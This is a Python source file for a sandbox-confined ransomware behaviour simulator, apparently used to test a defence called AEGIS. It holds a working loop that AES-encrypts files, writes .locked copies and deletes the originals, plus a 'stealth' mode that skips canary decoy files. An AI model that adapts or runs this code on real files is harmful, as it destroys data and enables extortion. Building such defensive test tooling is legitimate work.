"""
attacker.py - ARES Ransomware Behaviour Simulator (MITRE ATT&CK T1486)
=====================================================================
Real, sandbox-confined file encryptor used to evaluate the AEGIS defence.

For every target file it: reads plaintext -> AES-128-CBC encrypts (random
key + per-file IV) -> writes <name>.locked -> deletes the original.
It refuses to operate on any directory other than the sandbox folder.

Usage:
    python attacker.py [--delay 0.8] [--profile standard|stealth]

Profiles:
    standard  alphabetical sweep, touches everything (hits canaries early)
    stealth   skips well-known decoy name prefixes (000_, zzz_) and walks the
              directory in random order -> must be caught by the behavioural
              (mass-rename burst) detector instead of the canary trap.
"""
import argparse
import os
import random
import sys
import time

from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

HERE = os.path.dirname(os.path.abspath(__file__))
SANDBOX_DIR = os.path.join(HERE, "sandbox")
KEY_FILE = os.path.join(HERE, ".attacker_key.bin")  # kept OUTSIDE the sandbox


def load_key():
    key = os.urandom(16)  # fresh AES-128 key per run
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key


def encrypt_data(data: bytes, key: bytes) -> bytes:
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return iv + enc.update(padded) + enc.finalize()


def decrypt_data(blob: bytes, key: bytes) -> bytes:
    iv, ct = blob[:16], blob[16:]
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(dec.update(ct) + dec.finalize()) + unpadder.finalize()


def run_attack(delay: float, profile: str) -> int:
    target = os.path.abspath(SANDBOX_DIR)
    if os.path.basename(target) != "sandbox":  # hard safety interlock
        print("[ARES] refusing to run outside sandbox", flush=True)
        return 2
    if not os.path.isdir(target):
        print("[ARES] sandbox directory missing - start defense.py first", flush=True)
        return 2

    print("=" * 60)
    print(f" ATOMIC RED TEAM // T1486 RANSOMWARE SIMULATOR  pid={os.getpid()}")
    print("=" * 60, flush=True)

    key = load_key()
    names = [n for n in os.listdir(target)
             if os.path.isfile(os.path.join(target, n)) and not n.endswith(".locked")]
    if profile == "stealth":
        names = [n for n in names if not n.startswith(("000_", "zzz_"))]
        random.shuffle(names)
    else:
        names.sort()
    print(f"[ARES] T1083 discovery: {len(names)} target files (profile={profile})", flush=True)

    done = 0
    for name in names:
        path = os.path.join(target, name)
        time.sleep(delay)
        try:
            with open(path, "rb") as f:          # T1005
                plain = f.read()
            blob = encrypt_data(plain, key)      # T1486
            with open(path + ".locked", "wb") as f:
                f.write(blob)
            os.remove(path)                      # T1485
            done += 1
            print(f"[ARES] encrypted {name} -> {name}.locked", flush=True)
        except FileNotFoundError:
            continue
        except Exception as exc:
            print(f"[ARES] failed {name}: {exc}", flush=True)

    print(f"[ARES] sweep finished: {done} files encrypted", flush=True)
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--delay", type=float, default=0.8)
    ap.add_argument("--profile", choices=["standard", "stealth"], default="standard")
    a = ap.parse_args()
    sys.exit(run_attack(a.delay, a.profile))
